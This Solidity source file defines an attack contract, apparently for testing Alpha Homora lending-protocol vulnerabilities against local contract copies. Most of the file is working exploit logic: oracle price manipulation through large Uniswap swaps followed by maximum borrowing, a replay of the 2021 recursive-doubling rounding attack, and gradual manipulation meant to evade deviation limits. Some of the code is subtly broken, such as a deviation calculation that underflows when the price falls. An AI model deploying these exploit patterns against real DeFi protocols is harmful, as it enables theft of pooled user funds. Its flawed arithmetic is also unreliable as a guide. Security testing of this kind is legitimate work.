// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "./HomoraBankV2.sol";
import "./ProxyOracle.sol";

/**
 * @title FlashLoanAttacker
 * @notice Comprehensive attack contract for testing Alpha Homora vulnerabilities
 */
contract FlashLoanAttacker {
    HomoraBankV2 public immutable bank;
    ProxyOracle public immutable oracle;
    IERC20 public immutable alphaToken;
    IUniswapV2Pair public immutable pair;
    IUniswapV2Router02 public immutable router;
    
    address public owner;
    bool public attackSuccessful;
    uint256 public profit;
    
    event AttackExecuted(string attackType, bool success, uint256 profit);
    event PriceManipulated(uint256 oldPrice, uint256 newPrice, uint256 deviation);
    
    constructor(
        address _bank,
        address _oracle,
        address _alphaToken,
        address _pair,
        address _router
    ) {
        bank = HomoraBankV2(_bank);
        oracle = ProxyOracle(_oracle);
        alphaToken = IERC20(_alphaToken);
        pair = IUniswapV2Pair(_pair);
        router = IUniswapV2Router02(_router);
        owner = msg.sender;
    }
    
    /**
     * @notice Execute oracle manipulation attack
     * @dev Attack flow:
     * 1. Record initial price
     * 2. Swap large amount to manipulate price
     * 3. Deposit collateral at manipulated price
     * 4. Borrow maximum ETH
     * 5. Reverse swap
     * 6. Calculate profit
     */
    function executeOracleManipulation(uint256 alphaAmount) external payable {
        require(msg.sender == owner, "Not owner");
        
        uint256 initialETH = address(this).balance;
        uint256 initialAlpha = alphaToken.balanceOf(address(this));
        
        // Step 1: Record initial price
        uint256 priceBeforeAttack = oracle.getPriceUnsafe(address(alphaToken));
        
        // Step 2: Manipulate price by swapping ALPHA for ETH
        alphaToken.approve(address(router), alphaAmount);
        
        address[] memory path = new address[](2);
        path[0] = address(alphaToken);
        path[1] = router.WETH();
        
        uint256[] memory amounts = router.swapExactTokensForETH(
            alphaAmount,
            0,
            path,
            address(this),
            block.timestamp + 300
        );
        
        uint256 ethReceived = amounts[1];
        
        // Step 3: Check manipulated price
        uint256 priceAfterManipulation = oracle.getPriceUnsafe(address(alphaToken));
        uint256 deviation = ((priceAfterManipulation - priceBeforeAttack) * 1e18) / priceBeforeAttack;
        
        emit PriceManipulated(priceBeforeAttack, priceAfterManipulation, deviation);
        
        // Step 4: Try to exploit with manipulated price
        try this.exploitWithManipulatedPrice(alphaAmount / 100) {
            // Step 5: Reverse swap
            uint256 ethToSwapBack = ethReceived / 2;
            
            address[] memory reversePath = new address[](2);
            reversePath[0] = router.WETH();
            reversePath[1] = address(alphaToken);
            
            router.swapExactETHForTokens{value: ethToSwapBack}(
                0,
                reversePath,
                address(this),
                block.timestamp + 300
            );
            
            // Step 6: Calculate profit
            uint256 finalETH = address(this).balance;
            uint256 finalAlpha = alphaToken.balanceOf(address(this));
            
            if (finalETH > initialETH) {
                profit = finalETH - initialETH;
                attackSuccessful = true;
            }
            
            emit AttackExecuted("OracleManipulation", true, profit);
        } catch {
            // Attack prevented by deviation limits
            emit AttackExecuted("OracleManipulation", false, 0);
        }
    }
    
    /**
     * @notice Exploit lending with manipulated price
     */
    function exploitWithManipulatedPrice(uint256 collateralAmount) external {
        require(msg.sender == address(this), "Internal only");
        
        // Deposit collateral
        alphaToken.approve(address(bank), collateralAmount);
        bank.deposit(collateralAmount);
        
        // Try to borrow maximum at manipulated price
        uint256 health = bank.getPositionHealth(address(this));
        uint256 maxBorrow = (address(bank).balance * 100) / 150;
        
        bank.borrow(maxBorrow);
    }
    
    /**
     * @notice Execute 2021-style rounding error attack
     * @dev Replicates the February 2021 exploit
     */
    function executeRoundingAttack(uint256 initialBorrow) external payable {
        require(msg.sender == owner, "Not owner");
        
        uint256 initialBalance = address(this).balance;
        
        // Step 1: Deposit collateral
        uint256 collateral = alphaToken.balanceOf(address(this)) / 10;
        alphaToken.approve(address(bank), collateral);
        bank.deposit(collateral);
        
        // Step 2: Become sole borrower
        try bank.borrow(initialBorrow) {
            // Step 3: Attempt recursive doubling (2021 attack pattern)
            for (uint256 i = 0; i < 16; i++) {
                uint256 borrowAmount = initialBorrow * (2 ** i);
                
                if (borrowAmount > address(bank).balance) break;
                
                try bank.borrow(borrowAmount) {
                    // Borrow succeeded - vulnerability exists
                    continue;
                } catch {
                    // Borrow failed - vulnerability fixed
                    break;
                }
            }
            
            uint256 finalBalance = address(this).balance;
            if (finalBalance > initialBalance) {
                profit = finalBalance - initialBalance;
                attackSuccessful = true;
                emit AttackExecuted("RoundingError", true, profit);
            } else {
                emit AttackExecuted("RoundingError", false, 0);
            }
        } catch {
            emit AttackExecuted("RoundingError", false, 0);
        }
    }
    
    /**
     * @notice Execute gradual price manipulation
     * @dev Multi-step manipulation to stay within deviation limits
     */
    function executeGradualManipulation(uint256 alphaPerStep, uint256 steps) external payable {
        require(msg.sender == owner, "Not owner");
        
        uint256 initialPrice = oracle.getPriceUnsafe(address(alphaToken));
        
        for (uint256 i = 0; i < steps; i++) {
            // Swap to manipulate price gradually
            alphaToken.approve(address(router), alphaPerStep);
            
            address[] memory path = new address[](2);
            path[0] = address(alphaToken);
            path[1] = router.WETH();
            
            try router.swapExactTokensForETH(
                alphaPerStep,
                0,
                path,
                address(this),
                block.timestamp + 300
            ) {
                // Update oracle price
                try oracle.getPrice(address(alphaToken)) {
                    // Price update succeeded
                } catch {
                    // Deviation limit exceeded
                    emit AttackExecuted("GradualManipulation", false, 0);
                    return;
                }
            } catch {
                break;
            }
        }
        
        uint256 finalPrice = oracle.getPriceUnsafe(address(alphaToken));
        uint256 totalDeviation = ((finalPrice - initialPrice) * 1e18) / initialPrice;
        
        emit PriceManipulated(initialPrice, finalPrice, totalDeviation);
        
        // Try to exploit
        if (totalDeviation > 0.3e18) { // 30% manipulation
            attackSuccessful = true;
            emit AttackExecuted("GradualManipulation", true, 0);
        } else {
            emit AttackExecuted("GradualManipulation", false, 0);
        }
    }
    
    /**
     * @notice Simulate attack and return expected results
     */
    function simulateAttack(uint256 alphaAmount) external view returns (
        uint256 priceBeforeAttack,
        uint256 priceAfterManipulation,
        uint256 deviation,
        uint256 estimatedProfit,
        bool willSucceed
    ) {
        priceBeforeAttack = oracle.getPriceUnsafe(address(alphaToken));
        
        // Simulate price after swap
        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
        address token0 = pair.token0();
        
        uint256 alphaReserve = address(alphaToken) == token0 ? uint256(reserve0) : uint256(reserve1);
        uint256 ethReserve = address(alphaToken) == token0 ? uint256(reserve1) : uint256(reserve0);
        
        uint256 alphaInWithFee = alphaAmount * 997;
        uint256 ethOut = (alphaInWithFee * ethReserve) / (alphaReserve * 1000 + alphaInWithFee);
        
        uint256 newAlphaReserve = alphaReserve + alphaAmount;
        uint256 newEthReserve = ethReserve - ethOut;
        
        priceAfterManipulation = (newEthReserve * 1e18) / newAlphaReserve;
        deviation = ((priceAfterManipulation - priceBeforeAttack) * 1e18) / priceBeforeAttack;
        
        // Check if deviation exceeds limit
        willSucceed = deviation <= 0.5e18; // 50% limit
        
        if (willSucceed) {
            estimatedProfit = ethOut / 10; // Rough estimate
        }
    }
    
    /**
     * @notice Calculate profit from attack
     */
    function calculateProfit() external view returns (uint256) {
        return profit;
    }
    
    /**
     * @notice Check if attack was successful
     */
    function wasAttackSuccessful() external view returns (bool) {
        return attackSuccessful;
    }
    
    receive() external payable {}
}